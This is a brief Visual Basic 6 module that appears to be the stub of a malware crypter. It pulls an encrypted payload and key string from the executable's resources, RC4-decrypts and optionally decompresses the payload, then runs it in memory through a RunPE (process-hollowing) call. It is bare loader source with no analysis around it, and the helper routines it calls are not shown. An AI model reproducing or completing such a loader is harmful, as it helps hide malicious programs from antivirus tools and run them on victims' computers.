Attribute VB_Name = "Module1"
Option Explicit
Private Const RT_MESSAGETABLE      As Long = &H11
Public Sub Main()

Dim bTemp()     As Byte
Dim sTemp       As String
Dim sPush()     As String
Dim bFile()     As Byte

bTemp = GetResDataBytes(RT_MESSAGETABLE, 6000)
sTemp = GetResDataString(RT_MESSAGETABLE, 7000)

ReDim bFile(UBound(bTemp) - 10)
CallAPI "KERNEL32", "RtlMoveMemory", VarPtr(bFile(0)), VarPtr(bTemp(10)), UBound(bFile)

sPush() = Split(sTemp, "ZGUzkfgZTDFtzdIUtgugZzf")

Call RC4(bFile(), sPush(2))

If sPush(1) = 1 Then
bFile() = DeCompress(bFile())
End If

RunPE bFile(), App.path & "\" & App.EXEName & ".exe"
End
End Sub



